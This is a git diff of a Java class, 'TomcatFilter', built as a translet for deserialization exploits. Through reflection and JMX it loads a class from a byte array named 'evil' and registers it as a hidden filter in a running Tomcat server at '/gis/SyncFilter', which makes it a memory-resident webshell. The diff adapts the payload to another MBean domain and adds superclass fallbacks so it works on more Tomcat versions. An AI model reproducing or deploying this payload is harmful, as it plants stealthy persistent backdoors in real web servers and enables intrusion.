@@ -26,11 +26,6 @@ import java.util.Iterator;
 import java.util.Set;
 
 
-/**
- * tomcat全版本
- * created by 0x22cb7139 on 2021/6/29
- */
-
 public class TomcatFilter extends AbstractTranslet {
     @Override
     public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
@@ -50,7 +45,7 @@ public class TomcatFilter extends AbstractTranslet {
             Class clazz = (Class) defineclass.invoke(classloader,evil,0,evil.length);
 
             String filterName = "InvokerFilter";
-            String urlPattern = "/SyncFilter";
+            String urlPattern = "/gis/SyncFilter";
             MBeanServer mBeanServer = Registry.getRegistry(null,null).getMBeanServer();
             Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
             field.setAccessible(true);
@@ -59,8 +54,9 @@ public class TomcatFilter extends AbstractTranslet {
             field.setAccessible(true);
             Repository repository = (Repository) field.get(obj);
 
-            Set<NamedObject> objectSet =  repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
+            Set<NamedObject> objectSet =  repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
             Iterator<NamedObject> iterator = objectSet.iterator();
+            System.out.println("StrancardContext-Mbean:"+iterator.hasNext());
             while(iterator.hasNext()) {
                 try {
                     DynamicMBean dynamicMBean = iterator.next().getObject();
@@ -70,9 +66,15 @@ public class TomcatFilter extends AbstractTranslet {
 
                     field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                     field.setAccessible(true);
+
                     StandardContext standardContext = (StandardContext) field.get(obj);
 
-                    field = standardContext.getClass().getDeclaredField("filterConfigs");
+                    try{
+                        field = standardContext.getClass().getDeclaredField("filterConfigs");
+                    }catch (Exception e){
+                        field = standardContext.getClass().getSuperclass().getDeclaredField("filterConfigs");
+                    }
+
                     field.setAccessible(true);
                     HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);
 
@@ -92,12 +94,17 @@ public class TomcatFilter extends AbstractTranslet {
 
                         filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, new Object[]{filter.getClass().getName()});
                         filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, new Object[]{filter});
-                        standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});
+                        try{
+                            standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});
+                        }catch (Exception e){
+                            standardContext.getClass().getSuperclass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});
+                        }
+
 
                         Class filterMapClass = null;
                         try {
                             filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
-                        } catch (ClassNotFoundException e) {
+                        } catch (Exception e) {
                             filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                         }
 
@@ -105,7 +112,12 @@ public class TomcatFilter extends AbstractTranslet {
                         filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{filterName});
                         filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{DispatcherType.REQUEST.name()});
                         filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, new Object[]{urlPattern});
-                        standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});
+                        try{
+                            standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});
+                        }catch (Exception e){
+                            standardContext.getClass().getSuperclass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});
+                        }
+
 
                         Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{Context.class, filterDefClass});
                         constructor.setAccessible(true);
@@ -113,12 +125,12 @@ public class TomcatFilter extends AbstractTranslet {
                         map.put(filterName, filterConfig);
                     }
                 }catch (Exception e){
-                    //
+                    e.printStackTrace();
                 }
             }
 
         }catch (Exception e){
-
+            e.printStackTrace();
         }
     }
 }
